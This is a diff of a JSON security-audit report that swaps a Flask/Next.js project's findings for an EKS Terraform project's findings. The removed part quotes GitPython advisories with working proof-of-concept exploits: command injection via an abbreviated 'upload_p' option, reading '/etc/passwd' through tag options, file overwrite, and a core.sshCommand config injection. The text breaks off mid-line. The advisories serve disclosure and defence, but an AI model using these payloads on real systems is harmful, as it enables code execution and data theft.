@@ -1,700 +1,152 @@
 {
   "project": {
-    "name": "directorio-local",
-    "repositoryUrl": "https://github.com/Andiso67/vibeaudit.git",
-    "defaultBranch": "main",
-    "commitHash": "7b9b25b4aba05e07cb4e21840d48ce81d1e14504",
-    "languages": [
-      "C",
-      "C++",
-      "CSS",
-      "HTML",
-      "JavaScript",
-      "Python",
-      "Shell",
-      "TypeScript"
-    ],
-    "frameworks": [
-      "Flask",
-      "Next.js"
-    ],
+    "name": "EKS Workshop",
+    "repositoryUrl": null,
+    "defaultBranch": null,
+    "commitHash": null,
+    "languages": [],
+    "frameworks": [],
     "iacFiles": [
-      "Dockerfile"
+      "Terraform/main.tf",
+      "Terraform/providers.tf",
+      "Terraform/eks.tf",
+      "Terraform/vpc.tf"
     ]
   },
-  "vulnerabilities": [
-    {
-      "rule": "dockerfile.security.missing-user-entrypoint.missing-user-entrypoint",
-      "file": "Dockerfile",
-      "line": 33,
-      "severity": "HIGH",
-      "snippet": "requires login"
-    },
-    {
-      "rule": "dockerfile.security.missing-user.missing-user",
-      "file": "Dockerfile",
-      "line": 34,
-      "severity": "HIGH",
-      "snippet": "requires login"
-    }
-  ],
+  "vulnerabilities": [],
   "secrets": [],
   "iacIssues": [
     {
-      "rule": "CKV_DOCKER_2",
-      "file": "/Dockerfile",
-      "line": 1,
+      "rule": "CKV_TF_1",
+      "file": "Terraform/eks.tf",
+      "line": 6,
       "severity": "HIGH",
-      "snippet": "Ensure that HEALTHCHECK instructions have been added to container images"
+      "snippet": "Ensure Terraform module sources use a commit hash"
     },
     {
-      "rule": "CKV_DOCKER_3",
-      "file": "/Dockerfile",
-      "line": 1,
+      "rule": "CKV_TF_1",
+      "file": "Terraform/vpc.tf",
+      "line": 11,
       "severity": "HIGH",
-      "snippet": "Ensure that a user for the container has been created"
+      "snippet": "Ensure Terraform module sources use a commit hash"
     }
   ],
   "cicdIssues": [],
   "customIssues": [],
-  "llmFindings": [],
+  "llmFindings": [
+    {
+      "title": "CKV_TF_1: Ensure Terraform module sources use a commit hash",
+      "severity": "HIGH",
+      "checklistRef": "12-factor.dependencies",
+      "evidence": "Terraform/eks.tf:6, Terraform/vpc.tf:11",
+      "recommendation": "Use a commit hash for Terraform module sources",
+      "relatedFiles": [
+        "Terraform/eks.tf",
+        "Terraform/vpc.tf"
+      ]
+    },
+    {
+      "title": "CKV_TF_1: Ensure Terraform module sources use a commit hash",
+      "severity": "HIGH",
+      "checklistRef": "12-factor.dependencies",
+      "evidence": "Terraform/eks.tf:6, Terraform/vpc.tf:11",
+      "recommendation": "Use a commit hash for Terraform module sources",
+      "relatedFiles": [
+        "Terraform/eks.tf",
+        "Terraform/vpc.tf"
+      ]
+    },
+    {
+      "title": "Vulnerabilidad HIGH",
+      "severity": "HIGH",
+      "checklistRef": "owasp.vulnerable-deps",
+      "evidence": "",
+      "recommendation": "Actualizar dependencias con CVEs conocidos",
+      "relatedFiles": []
+    },
+    {
+      "title": "Secretos hardcodeados en el código",
+      "severity": "INFO",
+      "checklistRef": "12-factor.config",
+      "evidence": "",
+      "recommendation": "Gestionar secretos desde el entorno y un gestor de secretos",
+      "relatedFiles": []
+    },
+    {
+      "title": "Dependencias no declaradas explícitamente con versión fijada",
+      "severity": "INFO",
+      "checklistRef": "12-factor.dependencies",
+      "evidence": "",
+      "recommendation": "Declarar dependencias explícitamente con versión fija",
+      "relatedFiles": []
+    },
+    {
+      "title": "Servicios de apoyo tratados como recursos internos",
+      "severity": "INFO",
+      "checklistRef": "12-factor.backing-services",
+      "evidence": "",
+      "recommendation": "Tratar servicios de apoyo como recursos externos",
+      "relatedFiles": []
+    },
+    {
+      "title": "Políticas IAM con mínimo privilegio",
+      "severity": "INFO",
+      "checklistRef": "aws.iam-least-privilege",
+      "evidence": "",
+      "recommendation": "Seguir el principio de mínimo privilegio en IAM",
+      "relatedFiles": []
+    },
+    {
+      "title": "Cifrado de datos en reposo y tránsito no habilitado",
+      "severity": "INFO",
+      "checklistRef": "aws.encryption",
+      "evidence": "",
+      "recommendation": "Habilitar cifrado de datos en reposo y tránsito",
+      "relatedFiles": []
+    },
+    {
+      "title": "Registro y auditoría de recursos no habilitados",
+      "severity": "INFO",
+      "checklistRef": "aws.logging",
+      "evidence": "",
+      "recommendation": "Habilitar registro y auditoría de recursos",
+      "relatedFiles": []
+    },
+    {
+      "title": "Control de red y exposición no habilitado",
+      "severity": "INFO",
+      "checklistRef": "aws.network-security",
+      "evidence": "",
+      "recommendation": "Habilitar control de red y exposición",
+      "relatedFiles": []
+    }
+  ],
   "recurrentFindings": [],
   "cloudIssues": [],
-  "checklists": [],
+  "checklists": [
+    {
+      "name": "12-Factor",
+      "itemCount": 3,
+      "matchedFindings": 0
+    },
+    {
+      "name": "AWS WAF",
+      "itemCount": 4,
+      "matchedFindings": 0
+    },
+    {
+      "name": "OWASP",
+      "itemCount": 5,
+      "matchedFindings": 0
+    }
+  ],
   "metrics": {
-    "linesOfCode": 9864,
-    "testFiles": 14,
-    "dependenciesWithCves": [
-      "gitpython",
-      "pytest"
-    ],
-    "dependencyVulnerabilities": [
-      {
-        "name": "gitpython",
-        "ecosystem": "PyPI",
-        "version": "3.1.40",
-        "direct": false,
-        "dependencyType": "unknown",
-        "purl": "pkg:pypi/gitpython@3.1.40",
-        "cveIds": [
-          "CVE-2026-67325"
-        ],
-        "aliases": [
-          "GHSA-2f96-g7mh-g2hx"
-        ],
-        "cweIds": [
-          "CWE-184",
-          "CWE-78"
-        ],
-        "severity": "HIGH",
-        "cvssScore": 8.8,
-        "summary": "GitPython: Command Injection via git long-option prefix abbreviation bypass of CVE-2026-42215 blocklist",
-        "details": "## Command injection via long-option prefix abbreviation bypassing `check_unsafe_options` (incomplete fix of CVE-2026-42215 / GHSA-rpm5-65cw-6hj4)\n\n**Component:** gitpython-developers/GitPython (PyPI: GitPython)\n**Affected:** all versions carrying the 3.1.47 blocklist fix, through current `main` (verified at commit `20c5e275`, `3.1.50-42`)\n**CWE:** CWE-184 (Incomplete List of Disallowed Inputs) → CWE-78 (OS Command Injection)\n**Severity:** inherits the parent CVE-2026-42215 surface; estimated High, ~8.8 (`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) — final scoring deferred to maintainer/CNA, mirroring the parent.\n**Reporter:** hackkim\n\n### Summary\n\nThe 3.1.47 fix for CVE-2026-42215 blocks dangerous git options (`--upload-pack`, `--config`, `-c`, `-u` for clone; `--upload-pack` for fetch/pull; `--receive-pack`, `--exec` for push) so callers cannot reach command-executing options unless they pass `allow_unsafe_options=True`.\n\nThe fix canonicalizes an option name along **one** axis (underscore→hyphen via `dashify`) and checks it against an **exact-match** dict. It does not account for git's unambiguous long-option prefix abbreviation. Git accepts any unambiguous prefix of a long option (`--upload-p`, `--upload-pa`, `--upload-pac` all resolve to `--upload-pack`). So a kwarg key like `upload_p` canonicalizes to `upload-p`, misses the blocklist dict, and is emitted to git as `--upload-p=<value>` → executed as `--upload-pack=<value>` → command injection, in the default `allow_unsafe_options=False` configuration.\n\n### The asymmetry (root cause)\n\n```python\n# git/cmd.py (commit 20c5e275), lines 948-974\n@classmethod\ndef _canonicalize_option_name(cls, option):\n    option_name = option.lstrip(\"-\").split(\"=\", 1)[0]\n    option_tokens = option_name.split(None, 1)\n    if not option_tokens:\n        return \"\"\n    return dashify(option_tokens[0])      # only transform: \"_\" -> \"-\"\n\n@classmethod\ndef check_unsafe_options(cls, options, unsafe_options):\n    canonical_unsafe_options = {cls._canonicalize_option_name(o): o for o in unsafe_options}\n    for option in options:\n        unsafe_option = canonical_unsafe_options.get(cls._canonicalize_option_name(option))\n        if unsafe_option is not None:\n            raise UnsafeOptionError(...)\n```\n\nThe guard normalizes only `_`→`-` and does exact dict membership. Git's CLI parser accepts a broader grammar (prefix abbreviation) than the guard models, so abbreviated keys slip through and reach git as the blocked option.\n\n### Affected code (commit `20c5e275`)\n\n| Location | Role |\n|---|---|\n| `git/cmd.py:948-960` `_canonicalize_option_name` | canonicalizer — no prefix expansion |\n| `git/cmd.py:963-974` `check_unsafe_options` | exact-match dict lookup (the incomplete guard) |\n| `git/cmd.py:1511` `transform_kwarg` | emits `--<dashify(name)>=<value>` to the CLI |\n| `git/repo/base.py:1411,1413` | clone call sites |\n| `git/remote.py:1074,1128,1201` | fetch / pull / push call sites |\n\n### Bypass keys (verified)\n\n| kwarg key | git resolves to | path | weaponizable |\n|---|---|---|---|\n| `upload_p`, `upload_pac` | `--upload-pack` | clone / fetch / pull | Yes — direct RCE |\n| `receive_p` | `--receive-pack` | push | Yes — direct RCE |\n| `exe` | `--exec` | push | Yes — direct RCE |\n| `conf`, `confi` | `--config` | clone | bypasses option blocklist; RCE needs an additional config vector (see note) |\n\n### Minimal PoC\n\nSelf-contained, no network egress (a local bare repo acts as the \"remote\"). Tested on current `main` (git 2.50.1):\n\n```python\nimport os, stat, tempfile\nfrom git import Repo\n\nwork = tempfile.mkdtemp()\nmarker = os.path.join(work, \"RCE_MARKER\")\n\n# fake \"upload-pack\" program that proves arbitrary command execution\nprog = os.path.join(work, \"evil.sh\")\nwith open(prog, \"w\") as f:\n    f.write(f\"#!/bin/sh\\ntouch {marker}\\nexit 1\\n\")  # exit 1 so git aborts after our code ran\nos.chmod(prog, os.stat(prog).st_mode | stat.S_IEXEC)\n\nbare = os.path.join(work, \"remote.git\")\nRepo.init(bare, bare=True)\n\n# attacker-controlled kwarg KEY 'upload_p' -> --upload-p=<prog> -> git runs <prog>\ntry:\n    Repo.clone_from(bare, os.path.join(work, \"out\"), upload_p=prog)\nexcept Exception:\n    pass  # git aborts with GitCommandError AFTER the payload executed\n\nprint(\"RCE marker created:\", os.path.exists(marker))  # True -> command injection confirmed\n```\n\nEquivalent at the shell: `git clone --upload-p=/tmp/evil.sh src out` runs `evil.sh`.\n\nConfirmed behavior:\n- `upload_pack` (exact) → blocked; `upload_p` (abbrev) → passes guard, reaches git, executes. The fix works for the form it models but not the abbreviated form.\n- `allow_unsafe_options=True` opt-out behaves as documented (out of scope).\n\n### Honest scope note\n\nLike the parent CVE, exploitation requires a host application that flows attacker-controlled kwarg **keys** into a GitPython clone/fetch/pull/push. Where the host passes only fixed/validated keys, this is not reachable — the vulnerability is in the library's documented defense-in-depth control (`allow_unsafe_options=False`), which this variant defeats.\n\nOn the `--config` family: `conf` bypasses the option blocklist, but weaponizing `--config protocol.ext.allow=always` via an `ext::` URL is independently blocked by GitPython's protocol allowlist (`allow_unsafe_protocols=False`). The directly weaponizable family is `upload-pack` / `receive-pack` / `exec`. Reported transparently — not claiming Critical.\n\n### Suggested remediation (any one)\n\n1. **Prefix-aware matching:** reject any option whose canonical name is an unambiguous prefix of a blocked option (≈ `startswith` on the blocked canonical name, after `dashify`).\n2. **Disable abbreviation at the sink:** pass `--end-of-options` or invoke git in a way that disables long-option abbreviation.\n3. **Allowlist** option names on security-sensitive subcommands instead of a blocklist.\n\nRemediation should also cover the `-c`/`--config` family abbreviations, even though the `ext::` route is currently gated by the protocol allowlist.",
-        "fixedVersion": "3.1.51",
-        "affectedRange": ">=0,<3.1.51",
-        "isFixAvailable": true,
-        "exploitedInWild": null,
-        "epssScore": null,
-        "published": "2026-07-21T19:43:43Z",
-        "modified": "2026-08-02T03:56:45.052208380Z",
-        "references": [
-          "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-2f96-g7mh-g2hx",
-          "https://github.com/gitpython-developers/GitPython/pull/2161",
-          "https://github.com/gitpython-developers/GitPython/commit/56806080c1348749b07daa4a2024ce47b3cad285",
-          "https://github.com/gitpython-developers/GitPython",
-          "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.51"
-        ]
-      },
-      {
-        "name": "gitpython",
-        "ecosystem": "PyPI",
-        "version": "3.1.40",
-        "direct": false,
-        "dependencyType": "unknown",
-        "purl": "pkg:pypi/gitpython@3.1.40",
-        "cveIds": [
-          "CVE-2024-22190"
-        ],
-        "aliases": [
-          "GHSA-2mqj-m65w-jghx",
-          "PYSEC-2024-4"
-        ],
-        "cweIds": [
-          "CWE-426"
-        ],
-        "severity": "HIGH",
-        "cvssScore": 7.8,
-        "summary": "Untrusted search path under some conditions on Windows allows arbitrary code execution",
-        "details": "### Summary\n\nThis issue exists because of an incomplete fix for CVE-2023-40590. On Windows, GitPython uses an untrusted search path if it uses a shell to run `git`, as well as when it runs `bash.exe` to interpret hooks. If either of those features are used on Windows, a malicious `git.exe` or `bash.exe` may be run from an untrusted repository.\n\n### Details\n\nAlthough GitPython often avoids executing programs found in an untrusted search path since 3.1.33, two situations remain where this still occurs. Either can allow arbitrary code execution under some circumstances.\n\n#### When a shell is used\n\nGitPython can be told to run `git` commands through a shell rather than as direct subprocesses, by passing `shell=True` to any method that accepts it, or by both setting `Git.USE_SHELL = True` and not passing `shell=False`. Then the Windows `cmd.exe` shell process performs the path search, and GitPython does not prevent that shell from finding and running `git` in the current directory.\n\nWhen GitPython runs `git` directly rather than through a shell, the GitPython process performs the path search, and currently omits the current directory by setting `NoDefaultCurrentDirectoryInExePath` in its own environment during the `Popen` call. Although the `cmd.exe` shell will honor this environment variable when present, GitPython does not currently pass it into the shell subprocess's environment.\n\nFurthermore, because GitPython sets the subprocess CWD to the root of a repository's working tree, using a shell will run a malicious `git.exe` in an untrusted repository even if GitPython itself is run from a trusted location.\n\nThis also applies if `Git.execute` is called directly with `shell=True` (or after `Git.USE_SHELL = True`) to run any command.\n\n#### When hook scripts are run\n\nOn Windows, GitPython uses `bash.exe` to run hooks that appear to be scripts. However, unlike when running `git`, no steps are taken to avoid finding and running `bash.exe` in the current directory.\n\nThis allows the author of an untrusted fork or branch to cause a malicious `bash.exe` to be run in some otherwise safe workflows. An example of such a scenario is if the user installs a trusted hook while on a trusted branch, then switches to an untrusted feature branch (possibly from a fork) to review proposed changes. If the untrusted feature branch contains a malicious `bash.exe` and the user's current working directory is the working tree, and the user performs an action that runs the hook, then although the hook itself is uncorrupted, it runs with the malicious `bash.exe`.\n\nNote that, while `bash.exe` is a shell, this is a separate scenario from when `git` is run using the unrelated Windows `cmd.exe` shell.\n\n### PoC\n\nOn Windows, create a `git.exe` file in a repository. Then create a `Repo` object, and call any method through it (directly or indirectly) that supports the `shell` keyword argument with `shell=True`:\n\n```powershell\nmkdir testrepo\ngit init testrepo\ncp ... testrepo git.exe # Replace \"...\" with any executable of choice.\npython -c \"import git; print(git.Repo('testrepo').git.version(shell=True))\"\n```\n\nThe `git.exe` executable in the repository directory will be run.\n\nOr use no `Repo` object, but do it from the location with the `git.exe`:\n\n```powershell\ncd testrepo\npython -c \"import git; print(git.Git().version(shell=True))\"\n```\n\nThe `git.exe` executable in the current directory will be run.\n\nFor the scenario with hooks, install a hook in a repository, create a `bash.exe` file in the current directory, and perform an operation that causes GitPython to attempt to run the hook:\n\n```powershell\nmkdir testrepo\ncd testrepo\ngit init\nmv .git/hooks/pre-commit.sample .git/hooks/pre-commit\ncp ... bash.exe # Replace \"...\" with any executable of choice.\necho \"Some text\" >file.txt\ngit add file.txt\npython -c \"import git; git.Repo().index.commit('Some message')\"\n```\n\nThe `bash.exe` executable in the current directory will be run.\n\n### Impact\n\nThe greatest impact is probably in applications that set `Git.USE_SHELL = True` for historical reasons. (Undesired console windows had, in the past, been created in some kinds of applications, when it was not used.) Such an application may be vulnerable to arbitrary code execution from a malicious repository, even with no other exacerbating conditions. This is to say that, if a shell is used to run `git`, the full effect of CVE-2023-40590 is still present. Furthermore, as noted above, running the application itself from a trusted directory is not a sufficient mitigation.\n\nAn application that does not direct GitPython to use a shell to run `git` subprocesses thus avoids most of the risk. However, there is no such straightforward way to prevent GitPython from running `bash.exe` to interpret hooks. So while the conditions needed for that to be exploited are more involved, it may be harder to mitigate decisively prior to patching.\n\n### Possible solutions\n\nA straightforward approach would be to address each bug directly:\n\n- When a shell is used, pass `NoDefaultCurrentDirectoryInExePath` into the subprocess environment, because in that scenario the subprocess is the `cmd.exe` shell that itself performs the path search.\n- Set `NoDefaultCurrentDirectoryInExePath` in the GitPython process environment during the `Popen` call made to run hooks with a `bash.exe` subprocess.\n\nThese need only be done on Windows.",
-        "fixedVersion": "3.1.41",
-        "affectedRange": ">=0,<3.1.41",
-        "isFixAvailable": true,
-        "exploitedInWild": null,
-        "epssScore": null,
-        "published": "2024-01-10T15:46:00Z",
-        "modified": "2026-02-04T04:07:31.405532Z",
-        "references": [
-          "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-2mqj-m65w-jghx",
-          "https://nvd.nist.gov/vuln/detail/CVE-2024-22190",
-          "https://github.com/gitpython-developers/GitPython/pull/1792",
-          "https://github.com/gitpython-developers/GitPython/commit/ef3192cc414f2fd9978908454f6fd95243784c7f",
-          "https://github.com/gitpython-developers/GitPython",
-          "https://github.com/pypa/advisory-database/tree/main/vulns/gitpython/PYSEC-2024-4.yaml"
-        ]
-      },
-      {
-        "name": "gitpython",
-        "ecosystem": "PyPI",
-        "version": "3.1.40",
-        "direct": false,
-        "dependencyType": "unknown",
-        "purl": "pkg:pypi/gitpython@3.1.40",
-        "cveIds": [],
-        "aliases": [
-          "GHSA-3f7w-8rr8-f37f"
-        ],
-        "cweIds": [
-          "CWE-22",
-          "CWE-73",
-          "CWE-200"
-        ],
-        "severity": "HIGH",
-        "cvssScore": 8.1,
-        "summary": "GitPython: Unguarded git option forwarding in IndexFile.checkout() and TagReference.create() enables arbitrary file overwrite and arbitrary file read",
-        "details": "**Target:** gitpython-developers/GitPython\n**Tested:** HEAD `07e80555` (2026-07-25), latest release 3.1.55, `git version 2.50.1`\n**Reported instances:** 2 exploitable, from a sweep of 14 unguarded call sites\n\n## Summary\n\nGitPython blocks dangerous git options through `Git.check_unsafe_options()`, gated per method by an `allow_unsafe_options` parameter. That guard is applied **per call site**, so any API that forwards `**kwargs` into a git command without calling it passes caller-controlled options straight to git.\n\nA mechanical sweep of every method that forwards `**kwargs` into a `.git.<command>(...)` call found **14 sites with no guard**. Two reach a git option that takes a filesystem path:\n\n| # | Call site | git option | Impact |\n|---|---|---|---|\n| 1 | `IndexFile.checkout()` → `git checkout-index` | `--prefix=<path>` | arbitrary file **overwrite** with repository-controlled content |\n| 2 | `TagReference.create()` → `git tag` | `-F <file>` / `--file=<file>` | arbitrary file **read**, returned in-band |\n\nThis is the same defect class already fixed in `Commit.count()` (GHSA-p538-c434-8v24), `Repo.archive()` and `Git.ls_remote()` (GHSA-956x-8gvw-wg5v). Both instances below are still present at HEAD.\n\n---\n\n## Instance 1 — `IndexFile.checkout()`: arbitrary file overwrite\n\n`git/index/base.py:1210` accepts `**kwargs` and forwards them with no guard:\n\n```python\ndef checkout(self, paths=None, force=False, fprogress=lambda *args: None, **kwargs):\n    ...\n    proc = self.repo.git.checkout_index(*args, **kwargs)   # line 1331\n    ...\n    proc = self.repo.git.checkout_index(args, **kwargs)    # line 1349\n```\n\nThere is no `allow_unsafe_options` parameter and no `check_unsafe_options()` call in the method.\n\n`git checkout-index` accepts `--prefix=<string>`, prepended to every output path. It is not confined to the working tree, so an absolute prefix writes tracked file contents anywhere the process can write, and `-f` overwrites what is already there.\n\n### Reproduction\n\n```python\nfrom git import Repo\nRepo(\"/path/to/repo\").index.checkout(prefix=\"/tmp/target_dir/\", a=True, f=True)\n```\n\nObserved (`poc/poc_checkout_index.py`) — no exception raised, files land outside the repository:\n\n```\n[ALLOWED] no UnsafeOptionError raised\nfiles written outside the repo: ['f.txt']\n  f.txt: 'hi\\n'\n```\n\nOverwrite of a pre-existing file (`poc/poc_ci_overwrite.py`) — the victim file held `ORIGINAL-DO-NOT-CLOBBER\\n` before the call:\n\n```\n[ALLOWED] no exception\nvictim content now: 'hi\\n'\nOVERWRITTEN: True\n```\n\n### Why this rates High\n\nBoth halves of the write are attacker-influenced:\n\n- **Destination** — the `prefix` kwarg.\n- **Content** — the bytes written are repository blobs, so anyone who can land a file in the repository (a pull-request branch, a mirrored or untrusted repository, an agent-cloned repository) controls exactly what is written.\n\nCommit a file named `authorized_keys`, `.bashrc`, `config` or `post-checkout`, choose the matching prefix (`~/.ssh/`, `~/`, `.git/hooks/`), and the write becomes code execution as the service account.\n\nFor comparison within this project: GHSA-fjr4-x663-mwxc (arbitrary file overwrite via `git diff --output`) is rated High, and GHSA-p538-c434-8v24 (arbitrary file *truncation* via `git rev-list --output`) is rated Medium. `--prefix` supplies full content control, so it sits at or above the former.\n\n---\n\n## Instance 2 — `TagReference.create()`: arbitrary file read\n\n`git/refs/tag.py:88` forwards `**kwargs` into `git tag` with no guard, and the signature advertises the passthrough:\n\n```python\ndef create(cls, repo, path, reference=\"HEAD\", logmsg=None, force=False, **kwargs):\n    \"\"\"...\n    :param kwargs:\n        Additional keyword arguments to be passed to :manpage:`git-tag(1)`.\n    \"\"\"\n```\n\n`git tag` accepts `-F <file>` / `--file=<file>`, which reads the tag message from an arbitrary path. The annotated tag object stores that content and GitPython returns it to the caller via `TagReference.tag.message`, so the file contents come back in-band.\n\n### Reproduction\n\n```python\nfrom git import Repo\nfrom git.refs.tag import TagReference\n\nt = TagReference.create(Repo(\"/path/to/repo\"), \"x\", force=True, a=True, F=\"/etc/passwd\")\nprint(t.tag.message)\n```\n\nObserved (`poc/poc_tag_F.py`), reading a canary file outside the repository:\n\n```\n[ALLOWED] no UnsafeOptionError raised\n>>> tag message recovered from arbitrary path: 'TAG-READ-CANARY-98765\\nsecond-line-secret'\n```\n\nImpact is a read at the privileges of the process. I am not claiming code execution for this instance. The signing options (`-s`, `-u`/`--local-user`) do invoke gpg from the same unguarded kwargs, but I did not develop that into command execution and make no claim about it.\n\n---\n\n## Sweep results — the other 12 sites\n\nReported so the fix can be scoped once rather than per report. `poc/sweep.py` reproduces this list.\n\n| Call site | git command | Assessment |\n|---|---|---|\n| `IndexFile.from_tree()` | `read-tree` | `--index-output=<path>` looked reachable but is **neutralised**: GitPython appends its own `--index-output` after the caller's kwargs and git honours the last occurrence. Verified — victim file unchanged (`poc/poc_readtree.py`) |\n| `IndexFile.remove()` | `rm` | `--pathspec-from-file` only reads a pathspec; no write or disclosure primitive found |\n| `IndexFile.move()` | `mv` | same |\n| `HEAD.reset()` | `reset` | same |\n| `HEAD.checkout()` | `checkout` | same |\n| `Head.delete()`, `RemoteReference.delete()` | `branch` | no path-taking option found |\n| `Repo.merge_base()` | `merge-base` | no path-taking option found |\n| `Repo._get_untracked_files()` | `status` | no path-taking option found |\n| `Remote.set_url()`, `Remote.create()`, `Remote.update()` | `remote` | URL handling already addressed by GHSA-94p4-4cq8-9g67 |\n\n## Suggested remediation\n\n**Immediate:** add `allow_unsafe_options: bool = False` to both methods and gate `Git._option_candidates(args, kwargs)` against new lists — `unsafe_git_checkout_index_options = [\"--prefix\"]` (consider `--temp`) and `unsafe_git_tag_options = [\"--file\", \"-F\"]` (consider `-s`, `-u`/`--local-user`, `--cleanup`) — matching the pattern used in `Repo.archive()` and `Commit.count()`.\n\n**Structural:** this defect has now been fixed four times in four places (`Repo.archive()`, `Git.ls_remote()`, `Commit.count()`, and the two here), because the guard is opt-in per method: every new `**kwargs`-forwarding API starts unguarded and stays that way until someone reports it. Enforcing the check centrally in `Git._call_process()` — each git invocation consults a per-command unsafe-option table unless the caller opts out — would make new call sites safe by default rather than by review, and would close the remaining sites in the table above at the same time.\n\n## Disclosure\n\nReported privately via GitHub private vulnerability reporting.",
-        "fixedVersion": "3.1.57",
-        "affectedRange": ">=0,<3.1.57",
-        "isFixAvailable": true,
-        "exploitedInWild": null,
-        "epssScore": null,
-        "published": "2026-08-03T20:09:56Z",
-        "modified": "2026-08-03T20:15:17.708923062Z",
-        "references": [
-          "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-3f7w-8rr8-f37f",
-          "https://github.com/gitpython-developers/GitPython/pull/2193",
-          "https://github.com/gitpython-developers/GitPython/commit/3af0c2516c5e18c829da30338614688f6b69b49c",
-          "https://github.com/gitpython-developers/GitPython",
-          "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.57"
-        ]
-      },
-      {
-        "name": "gitpython",
-        "ecosystem": "PyPI",
-        "version": "3.1.40",
-        "direct": false,
-        "dependencyType": "unknown",
-        "purl": "pkg:pypi/gitpython@3.1.40",
-        "cveIds": [
-          "CVE-2026-69097"
-        ],
-        "aliases": [
-          "GHSA-3rp5-jjmw-4wv2"
-        ],
-        "cweIds": [
-          "CWE-74"
-        ],
-        "severity": "HIGH",
-        "cvssScore": 7.0,
-        "summary": "GitPython: git-config section-name injection enables arbitrary config directives (core.sshCommand RCE)",
-        "details": "### Summary\n\nIn GitPython `<= 3.1.52`, the config writer neutralizes only CR, LF, and NUL in configuration **names**, but writes section names into the `[...]` header with no other escaping. A section/subsection name that contains `] [ \"` closes the intended header and opens a second same-line section, injecting an arbitrary config directive — with no newline required. Because a submodule **name** is attacker-controlled data (it comes from a repository's `.gitmodules`, or from an application that lets a user name a submodule) and is written verbatim into the parent repository's trusted `.git/config`, an attacker can set `core.sshCommand` (or `alias.*`, `core.pager`, `core.fsmonitor`) and achieve remote code execution on the victim's next git operation. Likely **CWE-74 (Injection)**.\n\nThis is a distinct variant of the injection addressed by GHSA-mv93-w799-cj2w / GHSA-v87r-6q3f-2j67: those fixed **newline** injection into config values/names (patched in 3.1.50); the `[r\\n\\x00]` guard added for them does not stop a **same-line** section break inside a name.\n\n### Details\n\nThe only guard applied to section/option names before writing is `_assure_config_name_safe`, which uses a regex that matches solely CR/LF/NUL:\n\n`git/config.py:75,897-899` (`GitPython 3.1.52`):\n\n```python\nUNSAFE_CONFIG_CHARS_RE = re.compile(r\"[\\r\\n\\x00]\")\n...\ndef _assure_config_name_safe(self, name: \"cp._SectionName\", label: str) -> None:\n    if isinstance(name, str) and UNSAFE_CONFIG_CHARS_RE.search(name):\n        raise ValueError(\"Git config %s names must not contain CR, LF, or NUL\" % label)\n```\n\nThe name is then serialized into the header with no escaping of `]`, `[`, `\"`, space, `=` or `#`:\n\n`git/config.py:693`:\n\n```python\nfp.write((\"[%s]\\n\" % name).encode(defenc))\n```\n\nFor submodules the name is wrapped as `submodule \"<name>\"` (`git/objects/submodule/util.py:39`, `return f'submodule \"{name}\"'`), which supplies the balancing quote. A submodule named:\n\n```\nx\"] [core] sshCommand=CMD #\n```\n\ntherefore serializes to the header `[submodule \"x\"] [core] sshCommand=CMD #\"]`. git parses everything after the first `]` on that line as a fresh section, yielding `core.sshCommand=CMD` (the trailing `#\"]` is an inline comment). No CR/LF/NUL appears, so `_assure_config_name_safe` never fires.\n\nThe attacker-controlled name reaches this sink through documented public entry points that write it into the parent repository's `.git/config`:\n\n- `Repo.create_submodule(name=<untrusted>, ...)` → `Submodule.add` → `git/objects/submodule/base.py:619` `writer.set_value(sm_section(name), \"url\", url)` — a single call, no hostile remote required.\n- `Repo.clone_from(<hostile url>)` + `repo.submodule_update(init=True)` → `git/objects/submodule/base.py:855` `writer.set_value(sm_section(self.name), \"url\", self.url)`, where `self.name` is read unvalidated from the cloned repo's `.gitmodules`.\n\nAsymmetry: the sibling class is blocked — a newline in a config **value**, e.g. `set_value(\"core\", \"editor\", \"x\\n\\tsshCommand=CMD\")`, raises `ValueError`. The section-**name** bracket payload is not caught by the same guard.\n\n### PoC\n\nSingle self-contained script, run against the pinned release in an ephemeral environment. Non-destructive: the injected value is an inert marker, verified parse-only with `git config --get`; no ssh/fetch/push is run and nothing is executed.\n\n```python\n#!/usr/bin/env python3\n\"\"\"Minimal PoC: git-config section-name injection in GitPython==3.1.52.\"\"\"\nfrom importlib.metadata import version\nimport os, tempfile, subprocess\nimport git\n\nprint(f\"# GitPython {version('GitPython')}\")        # version proof -- first line\n\nMARKER = \"MARKER_9f3a\"                               # inert; never executed\ntmp = tempfile.mkdtemp()\nenv = {**os.environ, \"HOME\": tmp,\n       \"GIT_CONFIG_GLOBAL\": os.path.join(tmp, \"gc\"), \"GIT_CONFIG_SYSTEM\": os.devnull,\n       \"GIT_AUTHOR_NAME\": \"a\", \"GIT_AUTHOR_EMAIL\": \"a@b.c\",\n       \"GIT_COMMITTER_NAME\": \"a\", \"GIT_COMMITTER_EMAIL\": \"a@b.c\"}\n\ndef run(*a, cwd=None):\n    return subprocess.run(a, cwd=cwd, env=env, capture_output=True, text=True)\n\n# A benign local repo used as the submodule url (a plain path, no network).\nsrc = os.path.join(tmp, \"src\"); os.makedirs(src)\nrun(\"git\", \"init\", \"-q\", src)\nopen(os.path.join(src, \"f\"), \"w\").write(\"x\")\nrun(\"git\", \"add\", \"f\", cwd=src); run(\"git\", \"commit\", \"-qm\", \"i\", cwd=src)\nsuburl = os.path.join(tmp, \"sub.git\"); run(\"git\", \"clone\", \"-q\", \"--bare\", src, suburl)\n\ndef parent_repo():\n    p = tempfile.mkdtemp(dir=tmp)\n    run(\"git\", \"init\", \"-q\", p)\n    open(os.path.join(p, \"r\"), \"w\").write(\"x\")\n    run(\"git\", \"add\", \"r\", cwd=p); run(\"git\", \"commit\", \"-qm\", \"i\", cwd=p)\n    return p\n\ndef injected_sshcommand(parent):\n    r = run(\"git\", \"config\", \"-f\", os.path.join(parent, \".git\", \"config\"),\n            \"--get\", \"core.sshCommand\")\n    return (r.returncode, r.stdout.strip())\n\nbenign = \"docs\"\nevil   = f'x\"] [core] sshCommand={MARKER} #'          # closes the header, opens [core]\n\np_control = parent_repo()\ngit.Repo(p_control).create_submodule(name=benign, path=\"docs\", url=suburl)\np_exploit = parent_repo()\ngit.Repo(p_exploit).create_submodule(name=evil, path=\"sub\", url=suburl)\n\nctl = injected_sshcommand(p_control)\nexp = injected_sshcommand(p_exploit)\nheader = [l for l in open(os.path.join(p_exploit, \".git\", \"config\")).read().splitlines()\n          if l.startswith(\"[submodule\")][0]\n\nprint(\"control name :\", 